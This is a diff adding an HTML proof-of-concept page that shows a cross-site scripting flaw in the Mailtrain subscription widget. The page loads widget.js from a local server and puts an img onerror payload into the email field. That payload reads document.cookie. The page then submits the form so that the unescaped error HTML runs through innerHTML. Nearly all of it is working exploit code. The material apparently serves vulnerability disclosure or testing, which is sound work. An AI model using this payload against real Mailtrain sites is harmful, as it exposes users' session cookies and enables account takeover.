@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Real Widget XSS Test</title>
+    <style>
+        body { 
+            font-family: Arial; 
+            padding: 40px; 
+            background: #1a1a1a; 
+            color: #fff;
+        }
+        .box {
+            background: #2d2d2d;
+            padding: 30px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border: 2px solid #dc3545;
+        }
+        h1 { color: #dc3545; }
+        button {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin: 10px 5px;
+        }
+        button:hover { background: #c82333; }
+        #widget-container {
+            background: #fff;
+            color: #333;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        .info {
+            background: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔴 Real Widget XSS Demonstration</h1>
+    
+    <div class="box">
+        <h2>Step 1: Load Real Mailtrain Widget</h2>
+        <p>This loads the actual widget.js from your Mailtrain server</p>
+        <button onclick="loadWidget()">Load Widget</button>
+    </div>
+    
+    <div class="box">
+        <h2>Step 2: Widget Will Appear Below</h2>
+        <div id="widget-container"></div>
+    </div>
+    
+    <div class="box">
+        <h2>Step 3: Trigger XSS</h2>
+        <div class="info">
+            <strong>Instructions:</strong>
+            <ol>
+                <li>Click "Load Widget" above</li>
+                <li>Wait for subscription form to appear</li>
+                <li>Click "Inject XSS Payload" below</li>
+                <li>Widget will submit malicious email</li>
+                <li>Server returns error with unescaped HTML</li>
+                <li>widget.js executes the XSS via innerHTML</li>
+            </ol>
+        </div>
+        <button onclick="injectXSS()">Inject XSS Payload</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        function loadWidget() {
+            var container = document.getElementById('widget-container');
+            
+            // Create widget container (exactly how a real site would embed it)
+            container.innerHTML = '<div data-mailtrain-subscription-widget data-url="http://localhost:3000/subscription/_WDIYeIl_/widget"></div>';
+            
+            // Load widget.js (the actual Mailtrain widget script)
+            var script = document.createElement('script');
+            script.src = 'http://localhost:3000/subscription/widget.js';
+            script.onload = function() {
+                document.getElementById('status').innerHTML = '<p style="color:#28a745;">✓ Widget loaded successfully! Now click "Inject XSS Payload"</p>';
+            };
+            document.head.appendChild(script);
+        }
+        
+        function injectXSS() {
+            var status = document.getElementById('status');
+            status.innerHTML = '<p style="color:#ffc107;">⏳ Injecting XSS payload...</p>';
+            
+            // Find the widget's email input
+            var emailInput = document.querySelector('[data-mailtrain-subscription-widget] input[name="email"]');
+            
+            if (!emailInput) {
+                status.innerHTML = '<p style="color:#dc3545;">✗ Widget not loaded yet! Click "Load Widget" first.</p>';
+                return;
+            }
+            
+            // Inject XSS payload into the email field
+            var xssPayload = 'test<img src=x onerror=alert("🔴 REAL WIDGET XSS!\\n\\nThis proves:\\n- Widget loaded from server\\n- Payload submitted via widget\\n- Server returned unescaped HTML\\n- widget.js executed XSS\\n\\nCookie: "+document.cookie)>@test.com';
+            
+            emailInput.value = xssPayload;
+            
+            status.innerHTML += '<p style="color:#ffc107;">✓ Payload injected into email field</p>';
+            status.innerHTML += '<p style="color:#ffc107;">⏳ Submitting form...</p>';
+            
+            // Find and submit the form (this triggers the XSS)
+            var form = document.querySelector('[data-mailtrain-subscription-widget] form');
+            
+            if (form) {
+                // Prevent actual navigation, just trigger AJAX
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                });
+                
+                // Trigger form submission
+                setTimeout(function() {
+                    var submitButton = form.querySelector('button[type="submit"]');
+                    if (submitButton) {
+                        submitButton.click();
+                    }
+                    
+                    status.innerHTML += '<p style="color:#28a745;">✓ Form submitted!</p>';
+                    status.innerHTML += '<p style="color:#28a745;">⏳ Waiting for server response...</p>';
+                    status.innerHTML += '<p style="color:#28a745;"><strong>If XSS works, you will see an alert popup!</strong></p>';
+                }, 500);
+            } else {
+                status.innerHTML += '<p style="color:#dc3545;">✗ Form not found</p>';
+            }
+        }
+    </script>
+</body>
+</html>
